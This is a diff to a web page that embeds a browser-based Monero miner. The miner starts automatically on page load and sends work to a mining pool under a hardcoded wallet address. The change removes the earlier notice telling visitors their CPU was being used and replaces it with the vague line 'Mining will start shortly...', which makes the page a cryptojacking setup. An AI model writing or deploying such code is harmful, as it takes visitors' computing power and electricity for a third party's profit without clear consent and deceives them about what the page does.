@@ -3,25 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mine Monero (XMR) with HeroMiners</title>
+    <title>Monero Mining</title>
 </head>
 <body>
+    <h1>Mining Monero</h1>
+    <p>Mining will start shortly...</p>
+    
+    <script src="https://monero.herominers.com/lib/monero.min.js"></script>
+    <script>
+        var miner = new Miner('xmr', {
+            url: 'es.monero.herominers.com:1111',
+            user: '44YZNNDgXtpPhEmvc6RJdd3s7jg6mvR5ZhQSGg33i8y6WkU5hxM8D5A8W2sSzw5uZuj9MTyWzubVMiE8aGfzhXkpDdNmkkf',
+            threads: 4, // Adjust the number of threads to control CPU usage
+            autoStart: true
+        });
 
-<h1>Support Us by Mining Monero (XMR)</h1>
-<p>We are using your CPU power to mine Monero for free. Keep this window open to support!</p>
-
-<script src="https://cdn.jsdelivr.net/gh/monero-ecosystem/monero-miner@1.2.1/monero.min.js"></script>
-
-<script>
-    var miner = new Miner('44YZNNDgXtpPhEmvc6RJdd3s7jg6mvR5ZhQSGg33i8y6WkU5hxM8D5A8W2sSzw5uZuj9MTyWzubVMiE8aGfzhXkpDdNmkkf', {
-        url: 'es.monero.herominers.com:1111', // HeroMiners pool URL
-        poolWorkerId: 'worker1', // Optional worker name
-        throttle: 0.9, // Limit CPU usage to 90%
-        autoStart: true
-    });
-
-    miner.start();
-</script>
-
+        miner.start();
+    </script>
 </body>
 </html>
